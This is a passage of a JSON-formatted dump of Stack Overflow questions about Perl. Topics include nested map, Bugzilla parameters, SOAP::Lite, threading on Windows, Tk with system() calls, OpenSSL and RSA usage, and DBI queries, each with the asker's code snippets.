this?</p>\n\n<p>Thanks</p>\n"},{"tags":["perl","map","weak-typing"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":109,"score":1,"question_id":12917022,"title":"Is using nested map in perl a good practice?","body":"<pre><code>my @c= map {\n        my $v=$_;\n        map {$_ * $v } @m\n} @a;\n</code></pre>\n\n<p>Is using <code>map</code> like this, a good practice? Why not?\nIf not, what are other ways?</p>\n"},{"tags":["perl","cgi","bugzilla","mod-perl"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":29,"score":2,"question_id":12919236,"title":"Bugzilla 4.2.2: Adding attachment parameter to enter_bug.cgi call","body":"<p>On Bugzilla 4.2.2, I can set up default text for a bug with a call like:</p>\n\n<p><a href=\"http://bugzilla.foo.com/enter_bug.cgi?product=foobar&amp;short_desc=foobaz%20is%20broken\" rel=\"nofollow\">http://bugzilla.foo.com/enter_bug.cgi?product=foobar&amp;short_desc=foobaz%20is%20broken</a></p>\n\n<p>But I am not sure what to modify, or what parameter to pass, to get a default attachment filled in. The API documentation has information about attachments that already exist, or how to create an attachment once a bug has been filed, but not to (say) fill in the text block with the contents of a file. Any advice?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":76,"score":2,"question_id":12918393,"title":"Find a number and incrementing it","body":"<p>I want to create a small perl script that'll find a certain declaration in a c++ header in modify it. So far, I've been able to create the \"find\" part:</p>\n\n<pre><code>my $buildFile = \"..\\\\Support\\\\BuildVersion.h\";\n\nmy @result;\nopen( File, $buildFile ) or die \"Can't open $buildFile.\\n\";\n@result = &lt;File&gt;;\nclose( File );\n\nprint \"Updating build version...\\n\";\n\nopen( NEWFOUT, \"&gt;\", \"$buildFile\" ) or die \"Can't open $buildFile.\\n\";\nforeach( @result )\n{\n    print $_;\n    if( $_ =~ m/#define BUILD_COUNT [0-9]+/ig )\n    {\n        $_ =~ s/$_/#define BUILD_COUNT 77/;\n\n    }\n}\nprint NEWFOUT @result;\nclose( NEWFOUT );\n</code></pre>\n\n<p>So in my c++ file I have this definition named <code>BUILD_COUNT</code>. I want to call this script each time before I build my solution so that it will increment by 1 the value that follows <code>BUILD_COUNT</code>. How could I do that.</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":128,"score":-4,"question_id":12895524,"title":"How to make this foreach loop work?","body":"<p>I have Written a small code to subtract a specific number(499 here) from every line of my <code>test.dat</code> file. But this is not working. Input contains a number in every line. Please help me</p>\n\n<pre><code>open (F1, \"test.dat\" );\n\n\nforeach $line (F1)\n {  \n    $x = 0; \n    $x = $line-(499);\n    print $x;\n    $x = 0;              \n}\n</code></pre>\n"},{"tags":["perl","soap","wsdl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12910780,"title":"Perl SOAP::Lite WSDL with raw XML","body":"<p>I want to make a SOAP request with Perl and I want to send raw XML data like</p>\n\n<pre><code>$xml = \"&lt;IODATA&gt;\n  &lt;TEST&gt;\n    Hello World\n  &lt;/TEST&gt;\n&lt;/IODATA&gt;\";\n</code></pre>\n\n<p>I am using SOAP::Lite like this:</p>\n\n<pre><code>my $soap = SOAP::Lite-&gt;service('http://localhost/cms/WebService/RDCMSXMLServer.WSDL');\n$soap-&gt;Execute($xml, \"\", \"\");\n</code></pre>\n\n<p>But when I check the SOAP body my xml is parsed and looks like this:</p>\n\n<pre><code>&amp;lt;IODATA&amp;gt;\n</code></pre>\n\n<p>etc.</p>\n\n<p>The WSDL file:</p>\n\n<pre><code>&lt;?xml version='1.0' encoding='UTF-8' ?&gt;\n&lt;definitions\nname='RDCMSXMLServer'\ntargetNamespace='http://tempuri.org/RDCMSXMLServer/webservice/'\nxmlns:wsdlns='http://tempuri.org/RDCMSXMLServer/webservice/'\nxmlns:typens='http://tempuri.org/RDCMSXMLServer/type/'\nxmlns:soap='http://schemas.xmlsoap.org/wsdl/soap/'\nxmlns:xsd='http://www.w3.org/2001/XMLSchema'\nxmlns:stk='http://schemas.microsoft.com/soap-toolkit/wsdl-extension'\nxmlns:dime='http://schemas.xmlsoap.org/ws/2002/04/dime/wsdl/'\nxmlns:ref='http://schemas.xmlsoap.org/ws/2002/04/reference/'\nxmlns:content='http://schemas.xmlsoap.org/ws/2002/04/content-type/'\nxmlns:wsdl='http://schemas.xmlsoap.org/wsdl/'\nxmlns='http://schemas.xmlsoap.org/wsdl/'&gt;\n\n&lt;types&gt;\n    &lt;schema\n        targetNamespace='http://tempuri.org/RDCMSXMLServer/type/'\n        xmlns='http://www.w3.org/2001/XMLSchema'\n        xmlns:SOAP-ENC='http://schemas.xmlsoap.org/soap/encoding/'\n        xmlns:wsdl='http://schemas.xmlsoap.org/wsdl/'\n        elementFormDefault='qualified'&gt;\n\n        &lt;import namespace='http://schemas.xmlsoap.org/soap/encoding/'/&gt;\n        &lt;import namespace='http://schemas.xmlsoap.org/wsdl/'/&gt;\n        &lt;import namespace='http://schemas.xmlsoap.org/ws/2002/04/reference/'/&gt;\n        &lt;import namespace='http://schemas.xmlsoap.org/ws/2002/04/content-type/'/&gt;\n\n    &lt;/schema&gt;\n&lt;/types&gt;\n\n&lt;message name='XmlServer.Execute'&gt;\n    &lt;part name='sParamA' type='xsd:string'/&gt;\n    &lt;part name='sErrorA' type='xsd:anyType'/&gt;\n    &lt;part name='sResultInfoA' type='xsd:anyType'/&gt;\n&lt;/message&gt;\n\n&lt;message name='XmlServer.ExecuteResponse'&gt;\n    &lt;part name='Result' type='xsd:string'/&gt;\n    &lt;part name='sErrorA' type='xsd:anyType'/&gt;\n    &lt;part name='sResultInfoA' type='xsd:anyType'/&gt;\n&lt;/message&gt;\n\n&lt;portType name='XmlServerSoapPort'&gt;\n\n    &lt;operation name='Execute' parameterOrder='sParamA sErrorA sResultInfoA'&gt;\n        &lt;input message='wsdlns:XmlServer.Execute'/&gt;\n        &lt;output message='wsdlns:XmlServer.ExecuteResponse'/&gt;\n    &lt;/operation&gt;\n\n&lt;/portType&gt;\n\n&lt;binding name='XmlServerSoapBinding' type='wsdlns:XmlServerSoapPort' &gt;\n\n    &lt;stk:binding preferredEncoding='UTF-8'/&gt;\n    &lt;soap:binding style='rpc' transport='http://schemas.xmlsoap.org/soap/http'/&gt;\n\n    &lt;operation name='Execute'&gt;\n        &lt;soap:operation soapAction='http://tempuri.org/RDCMSXMLServer/action/XmlServer.Execute'/&gt;\n        &lt;input&gt;\n            &lt;soap:body\n                use='encoded'\n                namespace='http://tempuri.org/RDCMSXMLServer/message/'\n                encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\n                parts='sParamA sErrorA sResultInfoA'/&gt;\n        &lt;/input&gt;\n        &lt;output&gt;\n            &lt;soap:body\n                use='encoded'\n                namespace='http://tempuri.org/RDCMSXMLServer/message/'\n                encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\n                parts='Result sErrorA sResultInfoA'/&gt;\n        &lt;/output&gt;\n    &lt;/operation&gt;\n\n&lt;/binding&gt;\n\n&lt;service name='RDCMSXMLServer' &gt;\n    &lt;port name='XmlServerSoapPort' binding='wsdlns:XmlServerSoapBinding' &gt;\n        &lt;soap:address location='http://10.1.102.104:80/CMS/webservice/RDCMSXMLServer.WSDL'/&gt;\n    &lt;/port&gt;\n&lt;/service&gt;\n\n &lt;/definitions&gt;\n</code></pre>\n\n<p>How can I change that?</p>\n\n<p>Thank you very much in advance.</p>\n\n<p>Chris</p>\n"},{"tags":["perl","bash","pass"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12917585,"title":"Output of bash script in perl script","body":"<p>I want to embed a bash script inside  a perl script. I want to run my bash script by taking some variables from the perl script. Once it gets the variable the bash script takes over and tries to output the files that is created within.</p>\n\n<p>How can I pass the perl script variable to my bash script ?</p>\n\n<p>I do not know perl  but from what I read in Google, I can embed my bash script as</p>\n\n<pre><code>system(\"get_files.cmd -yr ${year}\");\n</code></pre>\n\n<p>where my bash script is <code>get_files.cmd</code>. </p>\n"},{"tags":["multithreading","perl"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":12913902,"title":"Multithreading in perl program giving unexpected result on windows","body":"<p>I am new to perl and trying out multithreading. I was expecting following program to create all the threads and print \"created all the threads\" at least after 5 seconds, once executed and all the threads waiting for the input value.</p>\n\n<pre><code>use threads;\n\nmy @arr = (1,2,3,4);\nforeach (@arr) {\n    sleep(1);\n    print \"\\ncreating...\\n\";\n    threads-&gt;new(\\&amp;echo, $_);\n    print \"\\ncreated\\n\";\n}\nprint \"\\ncreated all the threads\\n\";\nsleep(200); #wait for the threads to finish\n\nsub echo {\n    my ($thread) = @_;\n    print \"\\nthread($thread) Enter the value:\\n\";\n    my $value = &lt;&gt;;\n    print \"\\nthread($thread) Got value= $value\\n\";\n}\n</code></pre>\n\n<p>But I am getting following outout:</p>\n\n<pre><code>creating...\n\ncreated\n\nthread(1) Enter the value:\n\ncreating...\n</code></pre>\n\n<p>It seems the other 3 threads are not yet created, if I remove the sleep(1) I get sometimes expected result, but with the sleep(1) involved, even waiting for few minutes, I get the above result. What I may be missing? I think it is something basic, but I am not able to figure out.</p>\n\n<p>UPDATE:</p>\n\n<p>The same program works on Linux flawless, what could be the platform specific problem for windows?</p>\n\n<p>UPDATE2:</p>\n\n<p>Following java program on the same lines works just fine on the same box:</p>\n\n<pre><code>import java.io.IOException;\n\n\npublic class MT {\n\n    public static void main(String[] args)throws Exception {\n        for(int i=0;i&lt;4;i++){\n            Thread.sleep(2000);\n            new Thread(new Task(i)).start();\n        }\n        System.out.println(\"created all the threads\");\n        Thread.sleep(20000);\n\n    }\n\n    static class Task implements Runnable{\n\n        int i;\n        public Task(int i) {\n            super();\n            this.i = i;\n        }\n        @Override\n        public void run() {\n            try {\n                System.out.println(\"Thread:\"+i+\" Enter value\");\n                int x= System.in.read();\n                System.out.println(x);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>I am not sure how perl supports multithreading on windows!</p>\n"},{"tags":["perl","apache","dancer","plack"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12914865,"title":"Perl Dancer on Apache server using Plack::Runner","body":"<p>I have a Perl Dancer web app which I would like to run on an apache server (on centos 6).\nI put at the webapp's rootdir a sym link (index.html) to the public/dispatch.cgi script which uses the Pluck::Runner module.</p>\n\n<p>The problem is when loading the page, it can't find a needed files (such as the sqlite file), in fact the routing is messed up since it looks for routing at $appname/index.pl/blabla... instead of $appname/blabla...</p>\n\n<p>I think some kind of apache directive or rule is needed here but I don't these well enough.</p>\n\n<p>I hope some one could help me solving this issue.</p>\n\n<p>Thanks in advanced.\nRoy. </p>\n"},{"tags":["c++","perl","optimization","performance"],"answer_count":20,"favorite_count":17,"up_vote_count":58,"down_vote_count":5,"view_count":10646,"score":53,"question_id":885908,"title":"while (1) Vs. for (;;) Is there a speed difference?","body":"<p>Long version...</p>\n\n<p>A co-worker asserted today after seeing my use of <code>while (1)</code> in a Perl script that <code>for (;;)</code> is faster.  I argued that they should be the same hoping that the interpreter would optimize out any differences. I set up a script that would run 1,000,000,000 for loop iterations and the same number of while loops and record the time between. I could find no appreciable difference. My co-worker said that a professor had told him that the <code>while (1)</code> was doing a comparison <code>1 == 1</code> and the <code>for (;;)</code> was not.  We repeated the same test with the 100x the number of iterations with C++ and the difference was negligible. It was however a graphic example of how much faster compiled code can be vs. a scripting language.</p>\n\n<p>Short version...</p>\n\n<p>Is there any reason to prefer a <code>while (1)</code> over a <code>for (;;)</code> if you need an infinite loop to break out of?</p>\n\n<p><strong>Note:</strong> If it's not clear from the question.  This was purely a fun academic discussion between a couple of friends.  I am aware this is not a super important concept that all programmers should agonize over.  Thanks for all the great answers I (and I'm sure others) have learned a few things from this discussion.</p>\n\n<p><strong>Update:</strong> The aforementioned co-worker weighed in with a response below.</p>\n\n<p>Quoted here in case it gets buried.</p>\n\n<blockquote>\n  <p>It came from an AMD assembly programmer. He stated that C programmers\n  (the poeple) don't realize that their code has inefficiencies. He said\n  today though, gcc compilers are very good, and put people like him out\n  of business. He said for example, and told me about the <code>while 1</code> vs\n  <code>for(;;)</code>. I use it now out of habit but gcc and especially interpreters\n  will do the same operation (a processor jump) for both these days,\n  since they are optimized.</p>\n</blockquote>\n"},{"tags":["arrays","perl","reference"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":96,"score":1,"question_id":8045952,"title":"Bind values of a hash to elements of an iterated array of arrays","body":"<p>In <code>perl DBI</code>, you can bind a hash element value to a specific column of your query results.<br>\nSuch that,<br>\nas you fetch each row, the hash element value is updated to the current row.  </p>\n\n<p>I'm trying to figure out if there's a way to accomplish that in <em>core perl</em>,<br>\nusing an <em>hash of (array of arrays)</em>. </p>\n\n<p>The end goal is to be able to run something like this:</p>\n\n<pre><code>my $i;\nmy @a = (\n  [1,2,3],\n  [4,5,6],\n  [7,8,9]\n);\nmy %superhash{'first', 'second', 'third'} = (\\$i[0], \\$i[1], \\$i[2]);\nfor $i (@a) {\n  print ${$hash{'first'}} . \"\\n\";\n}\n</code></pre>\n\n<p>I'd love to be able to point <code>$hash{'first'}</code> to the first element in an <code>arrayref</code>, without having to have an array to point to beforehand.</p>\n\n<p>Expected output:</p>\n\n<pre><code>1\n4\n7\n</code></pre>\n\n<p>Of course, that code doesn't work, because there are no elements that <code>$i</code> references to, thus they are undefined.</p>\n"},{"tags":["regex","perl","tab-delimited-text"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12912297,"title":"Perl: Match exact word from tab-delimited file","body":"<p>I have a tab-delimited file (containing 2 columns) in the following format:</p>\n\n<pre><code>ABA-1 (tab)           CDF@\nABA-1 (tab)           EFG\nZYA (tab)             ABA-1 this\nEFG that this (tab)   ZYA\n</code></pre>\n\n<p>I want to match only /EFG/ and not /EFG that this/. Similarly, I want to only match /ABA-1/ and not /ABA-1 this/.</p>\n\n<p>The following pattern doesn't work:</p>\n\n<pre><code>$line=~ /^(\\w*\\-?\\w*\\@?)\\t*(\\w*\\-?\\w*\\@?)$/\n</code></pre>\n\n<p>I have tried using word boundaries (\\b) but it doesn't work either.</p>\n\n<p>Any ideas on how to tackle this issue? Any help will be highly appreciated. Thanks a lot!</p>\n"},{"tags":["perl","command","system","freeze","tk"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12899740,"title":"Perl freezes until ALL system() commands are done","body":"<p>Here is an example of a code in Perl with TK:</p>\n\n<pre><code>my $btn_start = $mw-&gt;Button(-image =&gt; $img_start, -command =&gt; \\&amp;start)-&gt;pack;\nMainLoop;\n\n\nsub start{\nmy $topWin = $mw -&gt; Toplevel;\nmy $entry = $topWin-&gt;Label(-textvariable=&gt;\\my $process)-&gt;pack();\n$process=\"start 1st\";\nsystem(\"long_command.exe\");\n$process.=\"\\nstart 2nd\";\nsystem(\"another_command.exe\");\n.\n.\n.\n$process.=\"\\nstart nth\";\nsystem(\"ncommand.exe\");\n}\n</code></pre>\n\n<p>The problem is when I press on the button, the toplevel window opens only after the system() commands finish the run (why do they start before anything else??), moreover $btn_start is still \"active\" during the whole process.\nI'm trying to achieve a status update after each system() command.</p>\n\n<p>Can you please advise?</p>\n\n<p>Thank you in advance,\nMark.</p>\n"},{"tags":["perl","datetime","formatting","timestamp"],"answer_count":4,"favorite_count":5,"up_vote_count":11,"down_vote_count":0,"view_count":7109,"score":11,"question_id":1814196,"title":"Quickly getting to YYYY-mm-dd HH:MM:SS in Perl","body":"<p>When writing Perl scripts I frequently find the need to obtain the current time represented as a string formatted as <code>YYYY-mm-dd HH:MM:SS</code> (say <code>2009-11-29 14:28:29</code>).</p>\n\n<p>In doing this I find myself taking this quite cumbersome path:</p>\n\n<ul>\n<li><code>man perlfunc</code></li>\n<li><code>/localtime</code> to search for localtime - repeat five times (<code>/</code> + <code>\\n</code>) to reach the relevant section of the manpage</li>\n<li>Copy the string <code>($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);</code> from the manpage to my script.</li>\n<li>Try with <code>my $now = sprintf(\"%04d-%02d-%02d %02d:%02d:%02d\", $year, $mon, $mday, $hour, $min, $sec);</code></li>\n<li>Remember gotcha #1: Must add 1900 to $year to get current year.</li>\n<li>Try with <code>my $now = sprintf(\"%04d-%02d-%02d %02d:%02d:%02d\", $year+1900, $mon, $mday, $hour, $min, $sec);</code></li>\n<li>Remember gotcha #2: Must add 1 to $mon to get current month.</li>\n<li>Try with <code>my $now = sprintf(\"%04d-%02d-%02d %02d:%02d:%02d\", $year+1900, $mon+1, $mday, $hour, $min, $sec);</code></li>\n<li>Seems ok. Done!</li>\n</ul>\n\n<p>While the process outlined above works it is far from optimal. I'm sure there is a smarter way, so my question is simply:</p>\n\n<p><b>What is the easiest way to obtain a <code>YYYY-mm-dd HH:MM:SS</code> of the current date/time in Perl?</b></p>\n\n<p>Where \"easy\" encompasses both \"easy-to-write\" and \"easy-to-remember\".</p>\n"},{"tags":["perl","loops","while-loop"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12911674,"title":"Perl while loop is repeating itself","body":"<p>I am 100% new to Perl but do have some PHP knowledge. I'm trying to create a quick script that will take the @url vars and save it to a .txt file. The problem that I'm having is that it's saving the url again everytime it runs through the loop which is super annoying. So when the loop runs, it'll look like this. </p>\n\n<pre><code>url1.com\nurl1.com url2.com\nurl1.com url2.com url3.com \n</code></pre>\n\n<p>What I would like it to look like is just a plain and simple:</p>\n\n<pre><code>url1.com\nurl2.com\nurl3.com\n</code></pre>\n\n<p>Here is my code. If anyone can help, I would appreciate it SO SO much!</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy $file = \"data.rdf.u8\";\nmy @urls;\n\nopen(my $fh, \"&lt;\", $file) or die \"Unable to open $file\\n\";\n\nwhile (my $line = &lt;$fh&gt;) {\n\n    if ($line =~ m/&lt;(?:ExternalPage about|link r:resource)=\"([^\\\"]+)\"\\/?&gt;/) {\n        push @urls, $1;\n    }\n\n    open (FH, \"&gt;&gt;my_urls.txt\") or die \"$!\";\n    print FH \"@urls \";\n    close(FH);\n}\n\nclose $fh; \n</code></pre>\n"},{"tags":["perl","opensl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12911750,"title":"Capturing SSL output using backticks Perl","body":"<p>I might be looking at this to simply and I am not sure what I want to do is possible but this hopefully will save a lot of time from having to read in and out to different files.</p>\n\n<p>I am trying to do is use backticks to receive the output of an OpenSLL exe which will encrypt a certain part of a string. Then use the output to add it into another file. OpenSLL will automatically output to a text file. </p>\n\n<p>For example:</p>\n\n<pre><code>Sample text: 1234, test text\nID- 1234, \nEncrypted text- test text\n</code></pre>\n\n<p>Will then be </p>\n\n<pre><code>ID- 1234, \nReturned encrypted text- **&amp;&amp;**&amp;&amp;\nAnd then be output to a file\n1234, **&amp;&amp;**&amp;&amp;\n</code></pre>\n\n<p>I know this can be done by reading in and parsing the encrypted text and then appending the output to a new file but as I am looking to do this for 100 or 1000 lines I was hoping to avoid this as it will be a lot of extra processing.</p>\n\n<p>Hopefully you can see my idea and if anyone could help it would be gratefully appreciated.</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\n\nmy $OpenSLLFile = \"\\\\openssl.exe\";\n\nmy $publickey = \"public.pem\";\nmy $privatekey = \"private.pem\";\nmy $inputtext = \"output.txt\";\nmy $outputtext = \"abcd.txt\";\nmy $compID = \"1232\";\n\nmy $encryptiontext = \"openssl rsautl -encrypt -pubin -inkey $publickey -in $inputtext -out $outputtext\";\nmy $decryptiontext = \"openssl rsautl -decrypt -inkey $privatekey -in encrypted.txt -out plaintext.txt\";\n\n#Idea 1\n#my $test = `$encryptiontext`;\n\n#Idea 2    \n#my $test = system (\"$encryptiontext\");\n\n#Idea 3\n`$encryptiontext`\nmy $test =  $?;\n\nopen (outputtest, '&gt;&gt;outputtest.txt') or die \"$!\";\n\nmy $a = \"$compID, $test\";\n\nprint outputtest \"$a\\n\";\n\nclose(outputtest);\n</code></pre>\n"},{"tags":["perl","encryption","openssl","rsa"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12908825,"title":"RSA decryption using the *public* key in Perl","body":"<p>I'm trying to decrypt an RSA encrypted message using the <em>public</em> key.</p>\n\n<p>Using <code>Crypt::OpenSSL::RSA</code>, I am able to encrypt using either key, but I can only decrypt with the private key. Attempting to decrypt with the public key:</p>\n\n<pre><code>use Crypt::OpenSSL::RSA;\nuse MIME::Base64;\nuse File::Slurp;\n\nmy $public_key  = 'rsa.pub.pem';\n#my $private_key = 'rsa.priv.pem';\nmy $rsa_public  = Crypt::OpenSSL::RSA-&gt;new_public_key(scalar read_file $public_key);\n#my $rsa_private = Crypt::OpenSSL::RSA-&gt;new_private_key(scalar read_file $private_key);\n\nmy $ciphertext_b64 = 'cqyPNNfqYaUeIsM1yAz7IsQ760Bkd4IPaatHnMQtQAMKtYTEUqFHwnSZ4hg2\npkoJM1N5Ejlv6Eqkk/ZaMWl1nTDOxRDj0V6PARQPqz3QF1UGWkSMxMt/DlSn\nAtrRXgjvrILbMX5BsV2S5mHcLoCeNVb+jdnX0x0Uu/AAFPsByPRrt1yM1ORo\nKcP+0ENvcvJ8yGOxJ2jOEmTFkQM5kjNDIFmLUlt6qODdTGWvYWR2CDduLO4m\nqiyAt4yK5K3vwMybAG5ceRGb/kmMSW10EnvbryIdDGVGS8Zvodu3xqtbM1Yo\ntdtZRDkcUcOYlUi3VRvSTimatVkJPG8QDlZofrBA0w==';\n\nmy $ciphertext = decode_base64($ciphertext_b64);\n\nprint $rsa_public-&gt;decrypt($ciphertext);\n#print $rsa_private-&gt;decrypt($ciphertext);\n</code></pre>\n\n<p>Results in: <code>Public keys cannot decrypt at test.pl line 19.</code></p>\n\n<p>Incidentally, Ruby seems to have no problem encrypting and decrypting with either key (which is why I'm currently in this situation).</p>\n"},{"tags":["perl","operators"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":4,"view_count":121,"score":0,"question_id":12911365,"title":"Meaning of // operator in perl","body":"<p>I am new to perl. Can anyone please explain the meaning of <code>//</code> operator in perl.</p>\n"},{"tags":["arrays","perl","pack"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12909153,"title":"how to compare packed arrays","body":"<p>I have a set of arrays that are packed like this:</p>\n\n<pre><code>sub pack_key {\n     return pack 'N' . ('w/a*' x @_), scalar(@_), @_;\n}\n</code></pre>\n\n<p>because I use them as multi-value-keys in a hash (i.e.: the keys to the hash are arrays).</p>\n\n<p>Is there any fast way to compare if the first n-elements in the packed array are the same? or to do the opposite - compare if the last m elements are different?</p>\n\n<p>There is an obvious solution, which is unpacking, and using the smartmatch operator (~~), but I am looking for something operating directly on the packed arrays.</p>\n\n<p>Thanks. </p>\n"},{"tags":["mysql","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":115,"score":4,"question_id":12908907,"title":"mysql non native, select only if table exists","body":"<p>This type of question has been posted a few times, but the solutions offered are not ideal in the following situation. In the first query, I'm selecting table names that I know exist when this first query is executed. Then while looping through them, I want to query the number of records in the selected tables, but only if they still exist. The problem is, during the loop, some of the tables are dropped by another script. For example : </p>\n\n<pre><code>SELECT tablename FROM table\n-- returns say 100 tables\n\nwhile (%tables){\n    SELECT COUNT(*) FROM $table\n    -- by the time it gets to the umpteenth table, it's been dropped\n    -- so the SELECT COUNT(*) fails\n}\n</code></pre>\n\n<p>And, I guess because it's run by cron, it fails fataly, and I get sent an email from cron stating it failed.</p>\n\n<blockquote>\n  <p>DBD::mysql::st execute failed: Table 'xxx' doesn't exist at\n  /usr/local/lib/perl/5.10.1/Mysql.pm line 175.</p>\n</blockquote>\n\n<p>Script is using the deprecated Mysql.pm perl module.</p>\n"},{"tags":["string","perl","unicode","bidi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":131,"score":1,"question_id":12890206,"title":"How do I reverse the order of two words in a string of arabic language?","body":"<p>I need to reverse the text direction of an arabic string in perl as I have done it in this <a href=\"http://jsfiddle.net/saurabh_saxena/ArKyx/2/\" rel=\"nofollow\">Fiddle</a> using CSS. I am a newbie in perl, so I need some guidance to get my expected result.</p>\n\n<p>I am looking for exactly same results as shown in the <a href=\"http://jsfiddle.net/saurabh_saxena/ArKyx/2/\" rel=\"nofollow\">Fiddle</a>. I have tried it using an advice in this <a href=\"http://stackoverflow.com/questions/3204668/how-do-i-reverse-the-order-of-two-words-in-a-string\">StackOverflow Question</a>.</p>\n\n<p>But this code is actually reversing the order of words in the text. If i do the same with arabic text, it will change its meaning.</p>\n\n<p>Thanks for help.</p>\n"},{"tags":["perl","w3c-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12907289,"title":"W3C validator showing error","body":"<p>After enter any URL when I click check in order to validate it shows.</p>\n\n<pre><code>Can't locate SGML/Parser/OpenSP.pm in @INC (@INC contains: C:/xampp/perl/lib C:/xampp/perl/site/lib .) at C:/xampp/htdocs/validator/httpd/cgi-bin/check line 64.\nBEGIN failed--compilation aborted at C:/xampp/htdocs/validator/httpd/cgi-bin/check line 64.\n</code></pre>\n\n<p>Any Idea why its happening?</p>\n"},{"tags":["string","perl","split"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12907471,"title":"Splitting strings with perl","body":"<p>I have a large chunk of text that will come through. I want to split the chunk so it is no longer than 50 characters. I can do that part, but what I really need is that it doesnt split in the middle of a word but on a blank. For instance, if I have the phrase:\n Hello world? I want to split this string!</p>\n\n<p>Lets say for example on that string I want to split it so it is no longer than 10 characters each segment, but I dont want to split a word. Is there an easy method to do that?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12906219,"title":"How do I get a command sent to a process without closing the process?","body":"<p>I am trying to start up a Postgres client and keep it around so I can send several SQL commands to it and gather the result for each command.  My current problem is the first set of commands don't seem to be sent to the process unless I close the file handle for sending the command.  But closing the file handle defeats the whole purpose of the program. </p>\n\n<p>Here is the code:</p>\n\n<pre><code>my ($child_read, $child_write);\nour $pid = open2($child_read, $child_write, '../psql -p 2070 super');\nprint STDOUT $pid . \"\\n\";\n$child_write-&gt;autoflush(1);\n\nmy $output1;\nmy $theCommands = \"set schema 'super'; \\n select count(*) from MyTable;\";\nprint $child_write $theCommands;\nclose($child_write);\n\nprint \"About to try and get query results. \\n\";\nwhile (&lt;$child_read&gt;)\n{\n    print \"$_\";\n}\n</code></pre>\n\n<p>The above code works.  I get the results of the query, but the only way I can get the SQL commands to execute is to close the $child_write file handle.  If I don't close it then the program hangs when trying to read the lines.  </p>\n\n<p>How do I get the SQL commands sent to the Postgres client without closing the $child_write file handle?</p>\n\n<p>This is a follow on question to <a href=\"http://stackoverflow.com/questions/12849554/looking-for-help-to-send-queries-to-postgres-from-perl\">Looking for help to send queries to Postgres from Perl</a>.</p>\n"},{"tags":["perl","sed","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":3,"view_count":118,"score":0,"question_id":12895371,"title":"print first 80 char in a line in unix pipe","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/137313/truncate-stdin-line-length\">Truncate stdin line length?</a>  </p>\n</blockquote>\n\n\n\n<p>I have been looking for an <code>awk</code> or <code>perl</code> (or maybe <code>sed</code>?) one-liner to print the first 80 char in a line to be used in as:</p>\n\n<pre><code>cat myfile.txt | # awk/perl here\n</code></pre>\n\n<p>I'm guessing something like <code>perl -pe 'print $_[0..80]'</code> should work but I'm no good in perl.</p>\n\n<p><strong>EDIT</strong> <code>perl -pe 'print $_[0..80]</code> does not work and I don't know why. That's why I asked this question. I feel like explaining after all those silent downvotes..</p>\n\n<p>Also <code>cat myfile.txt</code> is just to demonstrate that the command should be in a pipe, I'm actually using some other output.</p>\n"},{"tags":["perl","cgi","dbi"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":90,"score":3,"question_id":12904033,"title":"Reusing database query results (Perl)","body":"<p>I'm using Perl to populate two html tables (each table is generated in its own Perl CGI script). I have a 'helper' script that runs an SQL query. Here's an example (let's call  this script <code>run_sql_query.pl</code>):</p>\n\n<pre><code>my $sql_query = \"SELECT ID from TABLE where ID &gt; 3\";\nour $sth = $dbh-&gt;prepare($sql_query);\n$sth-&gt;execute;\n</code></pre>\n\n<p>Then, in each of my two Perl CGI scripts, I do:</p>\n\n<pre><code>require 'run_sql_query.pl';\n\nour $sth;\nwhile (my ($table_id) = $sth-&gt;fetchrow_array) {\n...\n}\n</code></pre>\n\n<p>However, it looks like <code>run_sql_query.pl</code> is running twice (once in each of the Perl CGI scripts). How can I have it so <code>run_sql_query.pl</code> gets executed only once and then use the same <code>$sth</code> contents in both of the Perl CGI scripts?</p>\n"},{"tags":["perl","apache","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":89,"score":0,"question_id":12903272,"title":"Premature end of script headers (perl+index.html)","body":"<p>Respected ppl 